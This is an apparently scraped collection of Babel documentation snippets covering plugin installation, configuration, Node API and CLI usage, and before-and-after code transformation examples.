CODE:
import getFunctionArity from "@babel/helper-get-function-arity";

function wrap(state, method, id, scope) {
  // ...
  if (!t.isFunction(method)) {
    return false;
  }

  const argumentsLength = getFunctionArity(method);

  // ...
}

----------------------------------------

TITLE: Babel Configuration Setup
DESCRIPTION: JSON configuration to enable the transform-merge-sibling-variables plugin in babel.config.json.

LANGUAGE: json
CODE:
{
  "plugins": ["transform-merge-sibling-variables"]
}

----------------------------------------

TITLE: Installing Babel Helper Module Imports
DESCRIPTION: Command to install the @babel/helper-module-imports package using npm.

LANGUAGE: shell
CODE:
npm install @babel/helper-module-imports --save

----------------------------------------

TITLE: Initializing Babel Plugin Test Runner in JavaScript
DESCRIPTION: Sets up the test runner in an index.js file within the test directory. The runner will automatically discover and execute tests in the fixtures directory.

LANGUAGE: javascript
CODE:
import runner from "@babel/helper-plugin-test-runner";

runner(__dirname);

----------------------------------------

TITLE: Transforming Math.floor() calls with babel-plugin-minify-builtins in JavaScript
DESCRIPTION: Demonstrates how the plugin transforms repeated Math.floor() calls into a single variable reference for optimization.

LANGUAGE: JavaScript
CODE:
Math.floor(a) + Math.floor(b)

LANGUAGE: JavaScript
CODE:
var _Mathfloor = Math.floor;

_Mathfloor(a) + _Mathfloor(b);

----------------------------------------

TITLE: Demonstrating Hack-style Pipeline with Placeholders
DESCRIPTION: This snippet shows how the pipeline operator works in Hack, using placeholders ($$) for each right-hand side of the pipeline. It demonstrates mapping, filtering, and counting operations on an array.

LANGUAGE: hack
CODE:
namespace Hack\UserDocumentation\Operators\Pipe\Examples\MapFilterCountPiped;

function piped_example(array<int> $arr): int {
  return $arr
    |> \array_map($x ==> $x * $x, $$)
    |> \array_filter($$, $x ==> $x % 2 == 0)
    |> \count($$);
}

var_dump(piped_example(range(1, 10)));

----------------------------------------

TITLE: Configuring Makefile for Babel Transpilation
DESCRIPTION: Defines Makefile rules to transpile JavaScript files from src/ to lib/ directory using Babel. Uses wildcard pattern matching to process all .js files and maintains directory structure.

LANGUAGE: make
CODE:
SRC = $(wildcard src/*.js)
LIB = $(SRC:src/%.js=lib/%.js)

lib: $(LIB)
lib/%.js: src/%.js babel.config.json
  mkdir -p $(@D)
  babel $< -o $@

----------------------------------------

TITLE: Using Babel Sticky Regex Plugin via Node API
DESCRIPTION: JavaScript code showing how to use the plugin programmatically through the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-sticky-regex"],
});

----------------------------------------

TITLE: Installing @babel/plugin-transform-block-scoped-functions
DESCRIPTION: Shows the npm command to install the @babel/plugin-transform-block-scoped-functions plugin as a development dependency.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-block-scoped-functions

----------------------------------------

TITLE: Using remove-console Babel Plugin via Node API
DESCRIPTION: Shows how to use the remove-console plugin programmatically through the Node.js API provided by @babel/core.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["transform-remove-console"],
});

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM installation command for the function bind plugin.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-proposal-function-bind

----------------------------------------

TITLE: Updating TSEnumDeclaration AST in Babel 8
DESCRIPTION: The AST structure for TypeScript enum declarations has changed in Babel 8. The members are now wrapped in a TSEnumBody node.

LANGUAGE: typescript
CODE:
// Example input
enum ColorType {
  Red,
  Green,
  Blue,
}

// AST in Babel 7
{
  type: "TSEnumDeclaration",
  id: Identifier("ColorType")
  members: [
    EnumMember("Red"),
    EnumMember("Green"),
    EnumMember("Blue")
  ]
}

// AST in Babel 8
{
  type: "TSEnumDeclaration",
  id: Identifier("ColorType")
  body: {
    type: "TSEnumBody",
    members: [
      EnumMember("Red"),
      EnumMember("Green"),
      EnumMember("Blue")
    ]
  }
}

----------------------------------------

TITLE: Adding Default Import with Hint
DESCRIPTION: Demonstrates adding a default import with a custom hint name using addDefault function. Handles name conflicts by adding numerical suffixes.

LANGUAGE: javascript
CODE:
import { addDefault } from "@babel/helper-module-imports";
// If 'hintedName' exists in scope, the name will be '_hintedName2', '_hintedName3', ...
addDefault(path, 'source', { nameHint: "hintedName" })

----------------------------------------

TITLE: Applying @babel/plugin-syntax-numeric-separator using Babel Node API
DESCRIPTION: JavaScript code snippet demonstrating how to use the @babel/plugin-syntax-numeric-separator plugin with Babel's Node API for code transformation.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-numeric-separator"]
});

----------------------------------------

TITLE: Using Babel Plugin via CLI
DESCRIPTION: This shell command demonstrates how to use the Babel plugin via the command-line interface.

LANGUAGE: shell
CODE:
babel --plugins @babel/@babel/plugin-transform-regexp-modifiers script.js

----------------------------------------

TITLE: Comparing Pipeline Operator Variants
DESCRIPTION: Examples comparing different pipeline operator variants (Current JS, F# style, and Smart style) showing transformation of nested function calls into pipeline syntax.

LANGUAGE: javascript
CODE:
let newScore = boundScore(
  0,
  100,
  add(7, double(person.score))
);

LANGUAGE: javascript
CODE:
let newScore = person.score
  |> double
  |> n => add(7, n)
  |> n => boundScore(0, 100, n);

LANGUAGE: javascript
CODE:
let newScore = person.score
  |> double
  |> add(7, #)
  |> boundScore(0, 100, #);

----------------------------------------

TITLE: Enabling JSX Support in JSPM Configuration
DESCRIPTION: Configuration snippet to enable JSX support in jspm by modifying the babelOptions configuration to have an empty blacklist array.

LANGUAGE: json
CODE:
"babelOptions": {
  "blacklist": []
}

----------------------------------------

TITLE: Installing @babel/plugin-transform-react-jsx-compat via npm
DESCRIPTION: This command installs the @babel/plugin-transform-react-jsx-compat plugin as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-react-jsx-compat

----------------------------------------

TITLE: Installing Babel External Helpers Plugin
DESCRIPTION: Command to install the @babel/plugin-external-helpers package as a development dependency using npm or yarn.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-external-helpers

----------------------------------------

TITLE: TypeScript Syntax Example
DESCRIPTION: Illustrates a TypeScript function with type annotations that Babel can process.

LANGUAGE: javascript
CODE:
function Greeter(greeting: string) {
  this.greeting = greeting;
}

----------------------------------------

TITLE: Configuring babel-plugin-minify-builtins in babel.config.json
DESCRIPTION: Demonstrates how to add the minify-builtins plugin to the Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["minify-builtins"]
}

----------------------------------------

TITLE: Installing @babel/standalone via npm
DESCRIPTION: Shows the npm command to install @babel/standalone as a project dependency.

LANGUAGE: shell
CODE:
npm install --save @babel/standalone

----------------------------------------

TITLE: Flow Exact Object Type Annotations
DESCRIPTION: Support for Flow exact object types using the sealed object syntax.

LANGUAGE: JavaScript
CODE:
var a : {| x: number, y: string |} = { x: 0, y: 'foo' };

----------------------------------------

TITLE: Using Babel Plugin via Node API
DESCRIPTION: JavaScript code example showing how to use the logical assignment operators transform plugin programmatically through the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-logical-assignment-operators"],
});

----------------------------------------

TITLE: Installing @babel/plugin-transform-template-literals
DESCRIPTION: Shows the npm command to install the @babel/plugin-transform-template-literals plugin as a development dependency.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-template-literals

----------------------------------------

TITLE: Configuring Babel for Nullish Coalescing Operator Transform
DESCRIPTION: Demonstrates how to configure Babel to use the nullish coalescing operator transform plugin in a babel.config.json file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-nullish-coalescing-operator"]
}

----------------------------------------

TITLE: Installing @babel/plugin-transform-proto-to-assign via npm
DESCRIPTION: This command installs the @babel/plugin-transform-proto-to-assign plugin as a dev dependency using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-proto-to-assign

----------------------------------------

TITLE: Installing Babel Core and Rollup Plugin Dependencies
DESCRIPTION: Command to install required Babel dependencies (@babel/core) and the Rollup plugin for Babel (@rollup/plugin-babel) as development dependencies. This setup is typically used for projects that need to transpile JavaScript code using Babel with Rollup as the bundler.

LANGUAGE: shell
CODE:
npm install --save-dev @rollup/plugin-babel @babel/core

----------------------------------------

TITLE: TypeScript function signatures for keyword and reserved word helpers
DESCRIPTION: These TypeScript function signatures describe various helper functions for detecting keywords and reserved words in JavaScript.

LANGUAGE: typescript
CODE:
function isReservedWord(word: string, inModule: boolean): boolean
function isStrictReservedWord(word: string, inModule: boolean): boolean
function isStrictBindOnlyReservedWord(word: string): boolean
function isStrictBindReservedWord(word: string, inModule: boolean): boolean
function isKeyword(word: string): boolean

----------------------------------------

TITLE: Adding Named Import
DESCRIPTION: Shows how to add a named import with automatic name generation using addNamed function.

LANGUAGE: javascript
CODE:
import { addNamed } from "@babel/helper-module-imports";
// if the hintedName isn't set, the function will gennerate a uuid as hintedName itself such as '_named'
addNamed(path, 'named', 'source');

----------------------------------------

TITLE: Babel Configuration Setup
DESCRIPTION: JSON configuration to enable the optional catch binding syntax plugin in Babel configuration file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-optional-catch-binding"]
}

----------------------------------------

TITLE: Using @babel/plugin-transform-modules-amd via Node API in JavaScript
DESCRIPTION: This JavaScript code snippet shows how to use the @babel/plugin-transform-modules-amd plugin programmatically with the Babel Core API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-modules-amd"],
});

----------------------------------------

TITLE: RegExp Duplicate Named Capturing Groups Example
DESCRIPTION: Demonstrates usage of duplicate named capturing groups in regular expressions, showing how the same group name can be used in alternative branches.

LANGUAGE: javascript
CODE:
const dateRE = /(?<year>\d\d\d\d)-(?<month>\d\d)|(?<month>\d\d)-(?<year>\d\d)/;

console.log("2022-12".match(dateRE).groups); // { year: "2022", month: "12" }
console.log("12-2022".match(dateRE).groups); // { year: "2022", month: "12" }

----------------------------------------

TITLE: Using babel-preset-env with 'useBuiltins: usage' Option
DESCRIPTION: Shows how babel-preset-env can automatically import only the necessary polyfills based on usage in the code and target environment support.

LANGUAGE: JavaScript
CODE:
import "core-js/modules/es6.promise";
var a = new Promise();

LANGUAGE: JavaScript
CODE:
import "core-js/modules/es7.array.includes";
[].includes
a.includes

----------------------------------------

TITLE: Installing Babel React Preset
DESCRIPTION: Shows the command to install the Babel React preset for JSX transformation support.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/preset-react

----------------------------------------

TITLE: Installing babel-plugin-minify-builtins via npm
DESCRIPTION: Shows the command to install the babel-plugin-minify-builtins package using npm.

LANGUAGE: Shell
CODE:
npm install babel-plugin-minify-builtins --save-dev

----------------------------------------

TITLE: Transforming Object.setPrototypeOf in JavaScript
DESCRIPTION: Demonstrates how the plugin transforms Object.setPrototypeOf(bar, foo) into a _defaults function call. This transformation allows for better compatibility in environments where Object.setPrototypeOf is not supported.

LANGUAGE: JavaScript
CODE:
Object.setPrototypeOf(bar, foo);

LANGUAGE: JavaScript
CODE:
var _defaults = ...;

_defaults(bar, foo);

----------------------------------------

TITLE: Computed Properties Transformation Output
DESCRIPTION: Transformed code showing how computed properties are handled using _defineProperty helper function.

LANGUAGE: javascript
CODE:
var _obj;

function _defineProperty(obj, key, value) {
  if (key in obj) {
    Object.defineProperty(obj, key, {
      value: value,
      enumerable: true,
      configurable: true,
      writable: true
    });
  } else {
    obj[key] = value;
  }

  return obj;
}

var obj = ((_obj = {}),
_defineProperty(_obj, "x" + foo, "heh"),
_defineProperty(_obj, "y" + bar, "noo"),
_defineProperty(_obj, "foo", "foo"),
_defineProperty(_obj, "bar", "bar"),
_obj);

----------------------------------------

TITLE: Plugin Usage via Node API - JavaScript
DESCRIPTION: JavaScript code showing how to use the plugin programmatically through the Babel Core API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-duplicate-keys"],
});

----------------------------------------

TITLE: Transforming typeof Symbol in JavaScript
DESCRIPTION: This snippet demonstrates how the plugin transforms typeof Symbol() checks. It replaces the native typeof operator with a custom function that handles Symbol instances.

LANGUAGE: JavaScript
CODE:
typeof Symbol() === "symbol";

LANGUAGE: JavaScript
CODE:
var _typeof = function(obj) {
  return obj && obj.constructor === Symbol ? "symbol" : typeof obj;
};

_typeof(Symbol()) === "symbol";

----------------------------------------

TITLE: Using object-super transform plugin via Babel CLI
DESCRIPTION: This shell command demonstrates how to use the @babel/plugin-transform-object-super plugin with the Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-object-super script.js

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the babel-plugin-transform-merge-sibling-variables as a development dependency.

LANGUAGE: shell
CODE:
npm install babel-plugin-transform-merge-sibling-variables --save-dev

----------------------------------------

TITLE: Finding all 'super()' calls using environmentVisitor
DESCRIPTION: TypeScript code snippet from @babel/helper-create-class-features-plugin that uses environmentVisitor to find all 'super()' calls within a class.

LANGUAGE: typescript
CODE:
const findBareSupers = traverse.visitors.merge<NodePath<t.CallExpression>>([
  {
    Super(path) {
      const { node, parentPath } = path;
      if (parentPath.isCallExpression({ callee: node })) {
        this.push(parentPath);
      }
    },
  },
  environmentVisitor,
]);

----------------------------------------

TITLE: Installing @babel/plugin-transform-modules-amd via npm
DESCRIPTION: This command installs the @babel/plugin-transform-modules-amd plugin as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-modules-amd

----------------------------------------

TITLE: Implementing Babel Plugin via Node API
DESCRIPTION: JavaScript code showing how to use the partial application syntax plugin programmatically through the Babel Core API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-partial-application"]
});

----------------------------------------

TITLE: Using Babel Caller API in Config Function
DESCRIPTION: Example of using Babel's caller API to apply different configurations based on the calling environment.

LANGUAGE: javascript
CODE:
function isBabelRegister(caller) {\n  return !!(caller && caller.name === "@babel/register");\n}\n\nmodule.exports = function(api) {\n  const isRegister = api.caller(isBabelRegister);\n  return {\n    // Configuration based on isRegister\n  };\n};

----------------------------------------

TITLE: Node API Implementation
DESCRIPTION: JavaScript code showing how to use the plugin programmatically via Babel's Node API

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["transform-undefined-to-void"],
});

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line usage example for transforming JavaScript files using the plugin.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-react-jsx-development script.js

----------------------------------------

TITLE: Example NODE_ENV Transformation Input
DESCRIPTION: Shows how process.env.NODE_ENV comparisons appear before transformation.

LANGUAGE: javascript
CODE:
process.env.NODE_ENV === "development";
process.env.NODE_ENV === "production";

----------------------------------------

TITLE: Implementing Firefox Class Bugfix Plugin via Node API
DESCRIPTION: JavaScript code showing how to use the plugin programmatically through Babel's Node API

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-bugfix-firefox-class-in-computed-class-key"],
});

----------------------------------------

TITLE: Installing @babel/plugin-transform-react-display-name via npm
DESCRIPTION: This command installs the @babel/plugin-transform-react-display-name plugin as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-react-display-name

----------------------------------------

TITLE: Installing Babel Minify Preset
DESCRIPTION: Command to install the babel-preset-minify package as a development dependency

LANGUAGE: shell
CODE:
npm install babel-preset-minify --save-dev

----------------------------------------

TITLE: Installing babel-plugin-transform-minify-booleans via npm
DESCRIPTION: Shows the npm command to install the plugin as a development dependency.

LANGUAGE: Shell
CODE:
npm install babel-plugin-transform-minify-booleans --save-dev

----------------------------------------

TITLE: Disabling Runtime Wrapper for RegExp Transformation
DESCRIPTION: Demonstrates the effect of disabling the runtime option, which prevents wrapping RegExps with the _wrapRegExp helper.

LANGUAGE: JavaScript
CODE:
var stringRe = /(?<quote>"|').*?\k<quote>/;

stringRe.test("'foo'"); // "true", works
stringRe.exec("'foo'").groups.quote; // Error

----------------------------------------

TITLE: Babel Configuration With Bluebird Options
DESCRIPTION: Plugin configuration with Bluebird coroutine options enabled.

LANGUAGE: json
CODE:
{
  "plugins": [
    [
      "@babel/plugin-transform-async-to-generator",
      {
        "module": "bluebird",
        "method": "coroutine"
      }
    ]
  ]
}

----------------------------------------

TITLE: Babel Node API Integration
DESCRIPTION: JavaScript code showing how to use the import reflection syntax plugin with Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-import-reflection"]
});

----------------------------------------

TITLE: Transforming Boolean Literals in JavaScript
DESCRIPTION: Demonstrates how the plugin transforms true and false boolean literals to their minified equivalents !0 and !1.

LANGUAGE: JavaScript
CODE:
true;
false;

LANGUAGE: JavaScript
CODE:
!0;
!1;

----------------------------------------

TITLE: Advanced Plugin Configuration
DESCRIPTION: JSON configuration with the throwIfClosureRequired option enabled for preventing automatic closure creation.

LANGUAGE: json
CODE:
{
  "plugins": [
    [
      "@babel/plugin-transform-block-scoping",
      {
        "throwIfClosureRequired": true
      }
    ]
  ]
}

----------------------------------------

TITLE: Configuring Babel to Use react-display-name Plugin in JSON
DESCRIPTION: This JSON configuration snippet shows how to include the @babel/plugin-transform-react-display-name plugin in a Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-react-display-name"]
}

----------------------------------------

TITLE: Using @babel/plugin-syntax-bigint via Babel CLI
DESCRIPTION: This shell command demonstrates how to use the @babel/plugin-syntax-bigint plugin with the Babel CLI to process a JavaScript file.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-bigint script.js

----------------------------------------

TITLE: filterItems Function TypeScript Definition
DESCRIPTION: TypeScript type definition for the filterItems function that determines required plugins based on compatibility data and targets

LANGUAGE: typescript
CODE:
function filterItems(
  list: { [feature: string]: Targets },

  // A set of plugins that should always be included
  includes: Set<string>,

  // A set of plugins that should always be excluded
  excludes: Set<string>,
  targets: Targets,

  // A set of plugins that should always be included if `includes` is empty
  defaultIncludes: Array<string> | null,

  // A set of plugins that should always be excluded if `excludes` is empty
  defaultExcludes?: Array<string> | null,

  // A map from transform plugin to syntax plugin for backward compatibility with older `@babel/parser` versions
  pluginSyntaxMap?: Map<string, string | null>
): Set<string>; // A set of enabled plugins

----------------------------------------

TITLE: Using @babel/plugin-transform-jscript via Babel CLI
DESCRIPTION: This shell command demonstrates how to use the @babel/plugin-transform-jscript plugin with the Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-jscript script.js

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the computed properties transform plugin.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-computed-properties

----------------------------------------

TITLE: Installing @babel/helper-environment-visitor via npm or yarn
DESCRIPTION: Command to install the @babel/helper-environment-visitor package using npm or yarn.

LANGUAGE: shell
CODE:
npm install @babel/helper-environment-visitor

----------------------------------------

TITLE: YAML Front Matter Configuration for Blog Post
DESCRIPTION: YAML configuration block defining metadata for the blog post including layout, title, authors, date, categories and JavaScript dependencies.

LANGUAGE: yaml
CODE:
---
layout: post
title:  "Babel and Summer of Code 2017"
authors: henry
date:   2017-08-09 12:00:00
categories: announcements
share_text: "Babel and Summer of Code 2017"
third_party_js:
- https://platform.twitter.com/widgets.js
custom_js_with_timestamps:
- docs.js
---

----------------------------------------

TITLE: Basic JSON Configuration
DESCRIPTION: Simple JSON configuration for enabling the minify-replace plugin without options.

LANGUAGE: json
CODE:
{
  "plugins": ["minify-replace"]
}

----------------------------------------

TITLE: Running Babel with Recast
DESCRIPTION: Shell command to run Babel with Recast for in-place transformations.

LANGUAGE: Shell
CODE:
babel src -d src

----------------------------------------

TITLE: Installing Minify Replace Plugin
DESCRIPTION: NPM command for installing the babel-plugin-minify-replace package as a development dependency.

LANGUAGE: shell
CODE:
npm install babel-plugin-minify-replace --save-dev

----------------------------------------

TITLE: Plugin Usage via Node API
DESCRIPTION: JavaScript code showing how to use the plugin programmatically through Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-destructuring"],
});

----------------------------------------

TITLE: Using Babel Plugin via CLI
DESCRIPTION: Demonstrates how to use the @babel/plugin-transform-template-literals plugin via the Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-template-literals script.js

----------------------------------------

TITLE: Using Plugin via Node API
DESCRIPTION: JavaScript code showing how to use the plugin programmatically through the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-member-expression-literals"],
});

----------------------------------------

TITLE: Basic Computed Properties Example Input
DESCRIPTION: Example showing object with computed property names before transformation.

LANGUAGE: javascript
CODE:
var obj = {
  ["x" + foo]: "heh",
  ["y" + bar]: "noo",
  foo: "foo",
  bar: "bar"
};

----------------------------------------

TITLE: Using annotateAsPure with Babel Traverse
DESCRIPTION: Example showing how to use annotateAsPure helper with @babel/traverse to mark CallExpressions as pure during code transformation.

LANGUAGE: javascript
CODE:
import traverse from "@babel/traverse";
import annotateAsPure from "@babel/helper-annotate-as-pure";

// ...

traverse(file, {
  CallExpression(path) {
    annotateAsPure(path);
  },
});

----------------------------------------

TITLE: Using remove-console Babel Plugin via CLI
DESCRIPTION: Demonstrates how to use the remove-console plugin with Babel via the command-line interface.

LANGUAGE: Shell
CODE:
babel --plugins transform-remove-console script.js

----------------------------------------

TITLE: Configuring Babel in package.json
DESCRIPTION: This snippet shows how to set up a script in package.json to use babel-node with specific presets and ignore patterns.

LANGUAGE: json
CODE:
{
  "scripts": {
    "babel-node": "babel-node --presets='@babel/preset-env' --ignore='foo|bar|baz'"
  }
}

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the Flow comments transform plugin

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-flow-comments

----------------------------------------

TITLE: Plugin Configuration - JSON
DESCRIPTION: Configuration setup in babel.config.json to enable the plugin.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-duplicate-keys"]
}

----------------------------------------

TITLE: Babili Webpack Configuration
DESCRIPTION: Example of configuring Babili with Webpack using both babel-loader and babili-webpack-plugin.

LANGUAGE: javascript
CODE:
module: {
  loaders: [
    {
      test: /\.js$/,
      loader: 'babel',
      query: {
        presets: ['babili']
      }
    }
  ]
}

----------------------------------------

TITLE: Applying object-super transform using Babel Node API
DESCRIPTION: This JavaScript snippet shows how to use the @babel/plugin-transform-object-super plugin programmatically with the Babel Core API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-object-super"],
});

----------------------------------------

TITLE: Transforming Exponentiation Operator Example - JavaScript
DESCRIPTION: Demonstrates how the exponentiation operator (**) is transformed into equivalent Math.pow() calls.

LANGUAGE: javascript
CODE:
let x = 10 ** 2;

x **= 3;

LANGUAGE: javascript
CODE:
let x = Math.pow(10, 2);

x = Math.pow(x, 3);

----------------------------------------

TITLE: Advanced JSON Configuration with Options
DESCRIPTION: Detailed JSON configuration showing how to configure the minify-replace plugin with custom replacement options.

LANGUAGE: json
CODE:
{
  "plugins": [
    ["minify-replace", {
      "replacements": [{
        "identifierName": "__DEV__",
        "replacement": {
          "type": "booleanLiteral",
          "value": true
        }
      }]
    }]
  ]
}

----------------------------------------

TITLE: Parser Options Configuration
DESCRIPTION: Example of configuring Babel parser options including custom parser support.

LANGUAGE: JavaScript
CODE:
{
  "parserOpts": {
    "allowImportExportEverywhere": true,
    "allowReturnOutsideFunction": true,
    "sourceType": "module",
    "plugins": ["flow"]
  }
}

----------------------------------------

TITLE: Transforming RegExp with 'm' Modifier in JavaScript
DESCRIPTION: This example shows the transformation of a regular expression with the 'm' (multiline) inline modifier. It converts the modifier to a lookahead assertion for line starts.

LANGUAGE: javascript
CODE:
// matches aa, a\naa, etc. but not a\na
const regex = /(?m:^a)a/

LANGUAGE: javascript
CODE:
const regex = /(?:(?:^|(?<=[\n\r\u2028\u2029]))a)a/

----------------------------------------

TITLE: Babel Configuration Setup
DESCRIPTION: JSON configuration to enable the type constructor minification plugin in babel.config.json.

LANGUAGE: json
CODE:
{
  "plugins": ["minify-type-constructors"]
}

----------------------------------------

TITLE: Node API Usage Example
DESCRIPTION: Demonstrates how to use the plugin programmatically via Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-modules-commonjs"],
});

----------------------------------------

TITLE: Configuring Babel Plugin with Options
DESCRIPTION: Shows how to configure the @babel/plugin-transform-template-literals plugin in a Babel configuration file with the 'loose' option set to true.

LANGUAGE: JSON
CODE:
{
  "plugins": [
    [
      "@babel/plugin-transform-template-literals",
      {
        "loose": true
      }
    ]
  ]
}

----------------------------------------

TITLE: Using @babel/plugin-transform-typeof-symbol via Node API
DESCRIPTION: This JavaScript code shows how to use the @babel/plugin-transform-typeof-symbol plugin programmatically with the Babel Core API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-typeof-symbol"],
});

----------------------------------------

TITLE: Configuring Babel Sticky Regex Plugin
DESCRIPTION: JSON configuration to enable the sticky regex plugin in babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-sticky-regex"]
}

----------------------------------------

TITLE: Importing environmentVisitor and requeueComputedKeyAndDecorators in Babel plugin
DESCRIPTION: Example of importing the required functions from @babel/helper-environment-visitor in a Babel plugin file.

LANGUAGE: javascript
CODE:
import environmentVisitor, {
  requeueComputedKeyAndDecorators
} from "@babel/helper-environment-visitor";

----------------------------------------

TITLE: Installing @babel/plugin-transform-private-property-in-object (Shell)
DESCRIPTION: Command to install the Babel plugin using npm package manager.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-private-property-in-object

----------------------------------------

TITLE: Creating an ArrayPattern Node
DESCRIPTION: Example of creating an ArrayPattern node using the t.arrayPattern(elements) builder function.

LANGUAGE: JavaScript
CODE:
t.arrayPattern(elements);

----------------------------------------

TITLE: Installing Babel Polyfills
DESCRIPTION: Shell command to install core-js for polyfill support in Babel

LANGUAGE: shell
CODE:
npm install --save core-js

----------------------------------------

TITLE: Babel Configuration Without Options
DESCRIPTION: Basic plugin configuration in babel.config.json without custom options.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-async-to-generator"]
}

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line interface usage for the export namespace plugin.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-export-namespace-from script.js

----------------------------------------

TITLE: Parsing Import Attributes in Babel 7.26.0
DESCRIPTION: Enable parsing of the import attributes Stage 4 proposal by default.



----------------------------------------

TITLE: Export Namespace Example in JavaScript
DESCRIPTION: Demonstrates the basic export namespace syntax that this plugin enables.

LANGUAGE: javascript
CODE:
export * as ns from "mod";

----------------------------------------

TITLE: Configuring Babel Plugin in JSON
DESCRIPTION: This JSON snippet shows how to configure the Babel plugin in a babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-regexp-modifiers"]
}

----------------------------------------

TITLE: Installing Babel CLI with npm
DESCRIPTION: Command to install the Babel CLI globally via npm, specifically version 6.1.0 or higher which includes the babel-doctor utility.

LANGUAGE: sh
CODE:
$ npm install -g babel-cli@^6.1.0

----------------------------------------

TITLE: Transforming Private Property in Object with 'loose' Option (JavaScript)
DESCRIPTION: Example of how the plugin transforms private property 'in' checks when the 'loose' option is enabled, resulting in a different output compared to the default transformation.

LANGUAGE: JavaScript
CODE:
class Foo {
  #bar = "bar";

  test(obj) {
    return #bar in obj;
  }
}

LANGUAGE: JavaScript
CODE:
class Foo {
  constructor() {
    Object.defineProperty(this, _bar, {
      writable: true,
      value: "bar",
    });
  }

  test() {
    return Object.prototype.hasOwnProperty.call(this, _bar);
  }
}

var _bar = babelHelpers.classPrivateFieldLooseKey("bar");

----------------------------------------

TITLE: Node API Implementation
DESCRIPTION: JavaScript code showing how to use the plugin programmatically via Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-export-namespace-from"],
});

----------------------------------------

TITLE: JSON Modules Import Configuration - JSON
DESCRIPTION: Configuration for @babel/plugin-proposal-json-modules to enable simplified CommonJS output using the uncheckedRequire option.

LANGUAGE: json
CODE:
{
  "plugins": [
    ["@babel/plugin-proposal-json-modules", { "uncheckedRequire": true }]
  ]
}

----------------------------------------

TITLE: Node API Usage
DESCRIPTION: Example of using the plugin programmatically via Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-class-static-block"],
});

----------------------------------------

TITLE: CLI Usage for Babel Transform
DESCRIPTION: Command line instruction for using the plugin with Babel CLI

LANGUAGE: shell
CODE:
babel --plugins transform-undefined-to-void script.js

----------------------------------------

TITLE: TDZ Example
DESCRIPTION: Example showing temporal dead zone behavior that is ignored by default but can be enabled with the tdz option.

LANGUAGE: javascript
CODE:
i;
let i;

----------------------------------------

TITLE: Installing ember-cli-babel via Ember CLI
DESCRIPTION: Command to install the ember-cli-babel addon which provides Babel transpilation support for Ember.js applications. This addon enables the use of next-generation JavaScript features in Ember projects.

LANGUAGE: sh
CODE:
ember install ember-cli-babel

----------------------------------------

TITLE: Using TransformBabel Task in MSBuild XML
DESCRIPTION: This snippet shows how to use the TransformBabel task in an MSBuild script. It specifies the source directory as the current project directory and leaves the target directory empty, which will output transformed files alongside the originals.

